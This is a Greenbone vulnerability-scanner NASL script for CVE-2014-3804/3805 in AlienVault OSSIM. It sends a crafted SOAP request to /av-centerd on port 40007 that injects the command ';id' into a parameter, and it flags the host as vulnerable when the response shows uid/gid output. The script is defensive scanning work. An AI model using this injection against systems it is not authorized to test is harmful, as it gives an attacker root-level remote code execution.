# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:alienvault:open_source_security_information_management";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105048");
  script_cve_id("CVE-2014-3804", "CVE-2014-3805");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2024-06-28T15:38:46+0000");

  script_name("AlienVault OSSIM Multiple RCE Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/67999");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/67998");

  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-06-20 12:08:51 +0200 (Fri, 20 Jun 2014)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_ossim_web_detect.nasl");
  script_require_ports("Services/www", 40007);
  script_mandatory_keys("OSSIM/installed");

  script_tag(name:"impact", value:"An attacker can leverage these issues to execute arbitrary code with
  root privileges.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP SOAP request and check the response.");

  script_tag(name:"insight", value:"The application fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"AlienVault OSSIM is prone to multiple remote code execution
  (RCE) vulnerabilities.");

  script_tag(name:"affected", value:"AlienVault OSSIM 4.6.1 and prior are vulnerable.");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if( ! wport = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:wport ) )
  exit( 0 );

port = 40007;
if( ! get_port_state( port ) )
  exit( 0 );

useragent = http_get_user_agent();
cmd = "id";
host = http_host_name( port:port );

soap = "<soap:Envelope soap:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/' xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/' " +
       "xmlns:soapenc='http://schemas.xmlsoap.org/soap/encoding/' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'>" +
       "<soap:Body><update_system_info_debian_package xmlns='AV/CC/Util'><c-gensym3 xsi:type='xsd:string'>VTTest</c-gensym3><c-gensym5 xsi:type='xsd:string'>VTTest</c-gensym5>" +
       "<c-gensym7 xsi:type='xsd:string'>VTTest</c-gensym7><c-gensym9 xsi:type='xsd:string'>VTTest</c-gensym9><c-gensym11 xsi:type='xsd:string'>;" +
       cmd +
       "</c-gensym11></update_system_info_debian_package></soap:Body></soap:Envelope>";

len = strlen( soap );

req = 'POST /av-centerd HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'SOAPAction: "AV/CC/Util#update_system_info_debian_package"\r\n' +
      'Content-Type: text/xml; charset=UTF-8\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' +
      soap;
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ "uid=[0-9]+.*gid=[0-9]+" )
{
  req_resp = 'Request:\n' + req + '\n\nResponse:\n' + buf;
  security_message( port:port, expert_info:req_resp );
  exit( 0 );
}

exit( 99 );
